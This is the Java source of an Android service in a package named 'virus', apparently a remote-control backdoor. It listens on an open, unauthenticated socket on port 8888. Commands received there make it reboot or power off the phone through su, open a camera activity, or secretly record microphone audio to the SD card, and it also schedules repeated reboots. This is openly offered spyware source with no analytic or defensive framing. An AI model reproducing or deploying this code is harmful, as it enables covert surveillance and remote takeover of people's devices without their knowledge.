package com.example.virus;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.zip.DataFormatException;

import com.example.virus.Util.CommandType;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Binder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class BackgroudService extends Service{

	public static final String ALARM_REBOOT_ACTION = "reboot.alarm.action";
	
	private String mIpAddress;
	private ServerThread mServerThread = null;
	private BackgroundBinder mBinder = new BackgroundBinder();
	
	@Override
	public void onCreate() {     
        super.onCreate();   
        mIpAddress = Util.getHostIp(this);
        mServerThread = new ServerThread();
        mServerThread.start();
        Log.d("MyService", "onCreate()");   
    }
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
        if (mServerThread == null) {
        	mServerThread = new ServerThread();
        	mServerThread.start();
        }
        this.registerReceiver(receiver, new IntentFilter(ALARM_REBOOT_ACTION));
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		this.unregisterReceiver(receiver);
		super.onDestroy();
	}

	private void execute(CommandType type) {
		switch (type) {
		case REBOOT:
			try {
				Runtime.getRuntime().exec("su -c reboot");
			} catch (IOException e) {
				e.printStackTrace();
			}
			break;
		case ALARM_REBOOT:
			final int RTIME = 5 * 60 * 10;
			AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
			Intent intent = new Intent();
			intent.setAction(ALARM_REBOOT_ACTION);
			PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
			Log.d("reboot", "before");
			am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + RTIME, pi);
			break;
		case SHUTDOWN:
			try {
				ProcessBuilder pb = new ProcessBuilder("/system/bin/sh");
				pb.directory(new File("/"));
				Process proc = pb.start();
				PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(proc.getOutputStream())), true); 
				out.println("su");
				Thread.sleep(1000);
				out.println("reboot -p");
				out.close();
				proc.destroy();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			break;
		case LAUNCH_CAMERA:
			Intent i = new Intent();
			i.setClass(this, CameraActivity.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			startActivity(i);
			break;
		case CONTROL_RECORD:
//			AudioManager amgr = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
//			amgr.setSpeakerphoneOn(true);
//			amgr.setRouting(AudioManager.MODE_NORMAL, AudioManager.ROUTE_EARPIECE, AudioManager.ROUTE_ALL);
////			setVolumeControlStream(AudioManager.STREAM_VOICE_CALL);
//			amgr.setMode(AudioManager.MODE_IN_CALL);;
			new RecordThread().start();
			break;
		default:
			break;
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		Log.d("MyService", "onBind()");  
		return mBinder;
	}    
	
	class RecordThread extends Thread {

		private final static int RECORD_TIME = 1 * 6 * 1000;
		@Override
		public void run() {
			MediaRecorder mRecorder = new MediaRecorder();
			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			File dir = Environment.getExternalStorageDirectory();
			SimpleDateFormat formate = new SimpleDateFormat("yy_MM_dd_HH_mm_ss");
			String name = formate.format(new Date()) + ".3pg";
			mRecorder.setOutputFile("/mnt/sdcard/" + name);
			try {
				mRecorder.prepare();
				mRecorder.start();
				Thread.sleep(RECORD_TIME);
				mRecorder.stop();
			} catch (IllegalStateException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
	}
	class ServerThread extends Thread {  
		
		@Override
        public void run(){ 
            ServerSocket serverSocket = null; 
            try { 
                serverSocket = new ServerSocket(8888); 
                Socket socket = serverSocket.accept(); 
                InputStream inputStream = socket.getInputStream(); 
                byte buffer [] = new byte[1024*4]; 
                int temp = 0; 
                while((temp = inputStream.read(buffer)) != -1){ 
//                    System.out.println(new String(buffer,0,temp)); 
                	Log.d("socket", "is: " + temp);
                	Log.d("socket", "buffer: " + new String(buffer, 0, temp));
                	int c = Integer.parseInt(new String(buffer, 0, 1));
                	CommandType type = CommandType.getCommandType(c);
                	if (type != null) {
                		execute(type);
                	}
//                	switch (c) {
//					case 1:
//						execute(CommandType.REBOOT);
//						break;
//					default:
//						break;
//					}
                } 
                
            } catch (IOException e) { 
                e.printStackTrace(); 
            } finally{ 
                try { 
                    serverSocket.close(); 
                } catch (IOException e) { 
                    e.printStackTrace(); 
                } 
            } 
         
        } 
	}

	class BackgroundBinder extends Binder {
		public void executeCommand(CommandType type) {
			execute(type);
		}
	}
	private BroadcastReceiver receiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			Log.d("reboot", "handle after");
			execute(CommandType.REBOOT);
//			try {
//				Runtime.getRuntime().exec("su -c reboot");
//			} catch (IOException e) {
//				e.printStackTrace();
//			}
		}
		
	};
}
